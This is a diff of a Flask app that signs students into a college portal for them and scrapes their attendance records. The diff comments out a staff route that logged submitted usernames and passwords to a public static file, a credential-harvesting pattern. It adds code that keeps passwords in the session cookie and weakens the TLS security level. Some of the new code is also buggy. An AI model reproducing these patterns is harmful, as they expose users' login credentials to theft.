@@ -1,4 +1,4 @@
-from flask import Flask, render_template, url_for, redirect, request, flash, send_from_directory
+from flask import Flask, render_template, url_for, redirect, request, flash, send_from_directory,session
 import requests
 from requests import adapters
 import ssl
@@ -19,19 +19,34 @@ def home():
 def staff():
     return render_template('staff.html')
 
-@app.route('/staff/attendance',  methods=['POST', 'GET'])
-def staff_attendance():
-    if request.method == 'POST':
-        user = request.form['username']
-        pas = request.form['DOB']
-        with open('static/user_data.txt', 'a') as file:
-            file.write(f'Username: {user}, Password: {pas}\n')
-        return redirect('https://mgc.ibossems.com/')
-    elif request.method == 'GET':
-        redirect(url_for('staff')) 
+# @app.route('/staff/attendance',  methods=['POST', 'GET'])
+# def staff_attendance():
+#     if request.method == 'POST':
+#         user = request.form['username']
+#         pas = request.form['DOB']
+#         with open('static/user_data.txt', 'a') as file:
+#             file.write(f'Username: {user}, Password: {pas}\n')
+#         return redirect('https://mgc.ibossems.com/')
+#     elif request.method == 'GET':
+#         redirect(url_for('staff')) 
 
 @app.route('/result', methods=['POST', 'GET'])
 def result():
+    class TLSAdapter(adapters.HTTPAdapter):
+
+            def init_poolmanager(self, connections, maxsize, block=False):
+                ctx = ssl.create_default_context()
+                ctx.set_ciphers('DEFAULT@SECLEVEL=1')
+                self.poolmanager = poolmanager.PoolManager(
+                        num_pools=connections,
+                        maxsize=maxsize,
+                        block=block,
+                        ssl_version=ssl.PROTOCOL_TLS,
+                        ssl_context=ctx)
+
+    req_session = requests.session()
+    req_session.mount('https://', TLSAdapter())
+        
     if request.method == 'POST':
         user = request.form['username']
         pas = request.form['DOB']
@@ -45,20 +60,12 @@ def result():
         result_url = 'https://mgc.ibossems.com/student/'
         list_url = 'https://mgc.ibossems.com/student/attendance/list'
         details_url = 'https://mgc.ibossems.com/student/studentdetails'
-        class TLSAdapter(adapters.HTTPAdapter):
+        remember_me = request.form.get('isChecked', False)
 
-            def init_poolmanager(self, connections, maxsize, block=False):
-                ctx = ssl.create_default_context()
-                ctx.set_ciphers('DEFAULT@SECLEVEL=1')
-                self.poolmanager = poolmanager.PoolManager(
-                        num_pools=connections,
-                        maxsize=maxsize,
-                        block=block,
-                        ssl_version=ssl.PROTOCOL_TLS,
-                        ssl_context=ctx)
-
-        session = requests.session()
-        session.mount('https://', TLSAdapter())
+        if remember_me:
+            session['username'] = user
+            session['password'] = pas
+            print(session.get('username'))
         response1 = session.get(form_url)
         payload = {
                 'username': user,
@@ -72,7 +79,7 @@ def result():
         'Sec-Fetch-Mode': 'cors',
         'Content-Type': 'application/x-www-form-urlencoded',
         }
-        response2 = session.post(result_url, data=payload)
+        response2 = req_session.post(result_url, data=payload)
         error = re.findall(r'<p[^>]*>(.*?)</p>', response2.text)
         
         if error:
@@ -80,7 +87,7 @@ def result():
                 return redirect(url_for('home'))
         
         if response2.status_code == 200:
-            response3 = session.get(details_url, headers=lis_headers)
+            response3 = req_session.get(details_url, headers=lis_headers)
             if response3.status_code == 200:
                 match = re.search(r"name:'student_name',\s+value:'([^']+)'", response3.text)
                 department_match = re.search(r"name:'department',\s+value:'([^']+)'", response3.text)
@@ -90,7 +97,7 @@ def result():
                 dept = department_match.group(1) if department_match else None
                     
 
-            lis_response = session.post(list_url, headers=lis_headers, data=lis)
+            lis_response = req_session.post(list_url, headers=lis_headers, data=lis)
             if lis_response.status_code == 200:
                 data = json.loads(lis_response.text)
                 send = {'od': [], 'absent': [], 'full_abs': []}
@@ -123,7 +130,14 @@ def result():
         return render_template('result.html', name=student_name, att=att_percent, att_details = send,
                     semester=sem,year=year,dept=dept, attendance_data=attendance_data, total_days=total_day)
     elif request.method == 'GET':
-        return redirect(url_for('home'))
+        if 'username' in session and 'password' in session:
+            user = session['username'] 
+            pas= session['password'] 
+            # Redirect to /result with stored credentials
+            return render_template('redirect_result.html', username=user, DOB=pas)
+        else:
+            # Redirect to home if no stored credentials
+            return redirect(url_for('home'))
 
 @app.route('/ads.txt')
 def serve_ads_txt():
